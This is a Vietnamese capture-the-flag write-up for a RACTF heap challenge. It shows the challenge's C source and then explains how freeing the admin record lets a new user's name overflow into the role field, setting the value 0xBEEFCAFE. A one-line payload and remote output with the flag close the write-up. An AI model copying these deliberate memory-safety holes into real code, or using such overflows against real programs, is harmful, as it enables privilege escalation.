# Phân tích:

```c
#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STR_EXPAND(tok) #tok
#define STR(tok) STR_EXPAND(tok)

#define USERNAME_LEN 20
#define DATABASE "database.txt"
#define FLAG "ractf{fake_flag}"

typedef enum {
	ROLE_USER,
	ROLE_ADMIN,
	ROLE_GOD = 0xBEEFCAFE,
} Role;

typedef struct {
	char name[USERNAME_LEN];
	Role role;
} User;

typedef struct {
	User* users;
	size_t num_users;
	size_t capacity;
} Users;

/**
 * Exit, printing a failure message before killing the program.
 */
void die(const char *restrict fmt, ...) {
	va_list args;
	va_start(args, fmt);
	vfprintf(stderr, fmt, args);
	va_end(args);
	exit(EXIT_FAILURE);
}

/**
 * Create a user struct with the given name and the ROLE_USER role.
 */
User* user_create(const char* name) {
	User* user = malloc(sizeof(User));

	strcpy(user->name, name);

	return user;
}

/**
 * Allocate and initialize the Users struct.
 */
Users* users_init(const size_t capacity) {
	Users* users = calloc(1UL, sizeof(Users));

	users->users = calloc(capacity, sizeof(User));
	users->num_users = 0UL;
	users->capacity = capacity;

	return users;
}

/**
 * Double the capacity of the users array.
 */
void users_extend_capacity(Users* users) {
	users->capacity <<= 1;
	users->users = realloc(users->users, users->capacity * sizeof(User));
}

/**
 * Add a user to the users struct.
 */
void users_add_user(Users* users, const char* name, Role role) {
	User* user = &users->users[users->num_users++];
	strcpy(user->name, name);
	user->role = role;
}

/**
 * Check whether a user is registered.
 * MUST BE CALLED BY AN ADMIN
 */
bool users_check_registered(const Users *const users, const User *const admin, const char *const name) {
	if (admin->role == ROLE_ADMIN) {
		for (size_t i = 0UL; i < users->num_users; i++) {
			User* user = &users->users[i];

			if (strncmp(user->name, name, 20UL) == 0) {
				return true;
			}
		}
	} else {
		die("[users_check_registered]\tInsufficient permissions.\n");
	}

	return false;
}

/**
 * Registers a new user in the database.
 */
void users_register_user(Users* users, const User *const admin, const User *const user) {
	if (admin->role == ROLE_ADMIN)
		users_add_user(users, user->name, ROLE_USER);
	else if (admin->role == ROLE_GOD)
		puts(FLAG);
	else
		die("[users_register_user]\tInsufficient permissions to register user, exiting.\n");
}

/**
 * Reads all the users and their roles from the file.
 */
Users* read_users(const char* filename) {
	FILE* file = fopen(filename, "r");
	if (file == NULL) die("Failed to open database file: \"%s\"\n", filename);
	size_t line_len,
				 lines_read = 0UL;
	char* lineptr = NULL;

	Users* users = users_init(10UL);

	while (getline(&lineptr, &line_len, file) != -1) {
		if (lines_read++ == users->capacity) {
			users_extend_capacity(users);
		}

		char name[21] = { 0 };
		char role[6] = { 0 };
		int num_parsed = sscanf(lineptr, "%" STR(USERNAME_LEN) "s %s", name, role);

		if (num_parsed != 2) goto parse_failed;

		if      (strcmp(role, "USER")  == 0) users_add_user(users, name, ROLE_USER);
		else if (strcmp(role, "ADMIN") == 0) users_add_user(users, name, ROLE_ADMIN);
		else if (strcmp(role, "GOD")   == 0) users_add_user(users, name, ROLE_GOD);
		else
parse_failed: die("[read_users]\tFailed to parse user line: \"%s\", exiting!\n", lineptr);
	}

	free(lineptr);

	return users;
}

/**
 * Saves the users database out to a file.
 */
void save_users(const Users *const users, const char *const filename) {
	FILE* file = fopen(filename, "w");
	for (size_t i = 0UL; i < users->num_users; i++) {
		User* user = &users->users[i];

		switch (user->role) {
			case ROLE_GOD:
				fprintf(file, "%" STR(USERNAME_LEN) "s GOD\n",   user->name);
				break;
			case ROLE_ADMIN:
				fprintf(file, "%" STR(USERNAME_LEN) "s ADMIN\n", user->name);
				break;
			case ROLE_USER:
				fprintf(file, "%" STR(USERNAME_LEN) "s USER\n",  user->name);
				break;
			default:
				die("[save_user]\tInvalid user role: %d, exiting!\n", user->role);
		}
	}
}

/**
 * Sets IO to non-buffering, not part of the challenge
 */
void setup_for_challenge() {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin,  NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

int main(void) {
	setup_for_challenge();

	Users* users = read_users(DATABASE);

	// get user to register
	puts("Hi, welcome to my users database.");
	printf("Please enter a user to register: ");
	char username[30] = { 0 },
			 *newline;
	fgets(username, 30, stdin);
	if ((newline = strchr(username, '\n')) != NULL)
		*newline = '\0';

	// create admin
	User* admin = user_create("admin");
	admin->role = ROLE_ADMIN;

	// check registered
	if (!users_check_registered(users, admin, username)) {
		// register the user
		free(admin);
		User* user = user_create(username);
		users_register_user(users, admin, user);
	}

	// save the new database
	save_users(users, DATABASE);

	return 0;
}
```

- Bài này cho sẵn source nên mình đỡ phải reverse trong ida.
- Ta thấy để cat được flag ở hàm users_register_user thì role của ta phải là role_god. Để thành role God ta cần phải có role là ROLE_GOD = 0xBEEFCAFE.

    ```c
    void users_register_user(Users* users, const User *const admin, const User *const user) {
    	if (admin->role == ROLE_ADMIN)
    		users_add_user(users, user->name, ROLE_USER);
    	else if (admin->role == ROLE_GOD)
    		puts(FLAG);
    	else
    		die("[users_register_user]\tInsufficient permissions to register user, exiting.\n");
    }
    ```

- Ta thấy trong main có đoạn này gọi hàm users_register_user:

    ```c
    if (!users_check_registered(users, admin, username)) {
    		// register the user
    		free(admin);
    		User* user = user_create(username);
    		users_register_user(users, admin, user);
    	}
    ```

    - Tham số truyền vào là users, admin, username thì tham số ta cần lưu ý là admin vì nó sẽ set role của admin trong hàm users_register_user, vậy giờ ta cần tìm chỗ tạo admin, nhìn lên 1 xíu ta thấy đoạn code sau:

        ```c
        // create admin
        	User* admin = user_create("admin");
        	admin->role = ROLE_ADMIN;
        ```

        - Ta xem hàm user_create nhé.

            ```c
            User* user_create(const char* name) {
            	User* user = malloc(sizeof(User));

            	strcpy(user->name, name);

            	return user;
            }
            ```

            - Ta thấy nó sẽ malloc 1 size với sizeof(User) mà User bao gồm

            ```c
            typedef struct {
            	char name[USERNAME_LEN];
            	Role role;
            } User;
            ```

            Vậy là nó sẽ malloc 1 size đủ để nhập name, và role luôn, trong đó name có size là #define USERNAME_LEN 20, vậy ta có thể set role cho user bằng bằng cách nhập role sau khi nhập 20 char name.

# Exploit

- Vậy để exploit ta chỉ cần tạo 1 user có role God, ta chỉ cần nhập input "a"*20+p32(0xBEEFCAFE) sẽ được flag.

```c
[+] Opening connection to 193.57.159.27 on port 25467: Done
[*] Switching to interactive mode
Hi, welcome to my users database.
Please enter a user to register: ractf{w0w_1_w0nD3r_wH4t_free(admin)_d0e5}
```
